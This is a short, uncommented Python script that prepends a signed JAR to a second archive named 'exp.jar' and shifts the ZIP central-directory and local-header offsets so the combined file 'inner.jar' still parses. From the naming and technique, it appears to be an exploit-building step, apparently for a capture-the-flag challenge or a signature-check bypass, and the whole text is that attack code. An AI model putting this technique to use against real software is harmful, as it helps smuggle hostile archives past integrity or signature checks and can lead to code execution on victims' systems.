with open('hello.jar', 'rb') as f:
    signed = f.read()

with open('exp.jar', 'rb') as f:
    exp = f.read()

shift = len(signed)
exp_list = list(exp)

eocd_start = exp.rfind(b'PK\x05\x06')
cd_offset = int.from_bytes(exp[eocd_start+16:eocd_start+20], 'little')
new_cd_offset = (cd_offset + shift).to_bytes(4, 'little')
exp_list[eocd_start+16:eocd_start+20] = new_cd_offset

cd_start = cd_offset
pos = cd_start
while pos < eocd_start:
    if exp[pos:pos+4] == b'PK\x01\x02':
        lfh_offset = int.from_bytes(exp[pos+42:pos+46], 'little')
        new_lfh_offset = (lfh_offset + shift).to_bytes(4, 'little')
        exp_list[pos+42:pos+46] = new_lfh_offset
        pos += 46
    else:
        pos += 1

modified_exp = bytes(exp_list)
with open('inner.jar', 'wb') as f:
    f.write(signed)
    f.write(modified_exp)
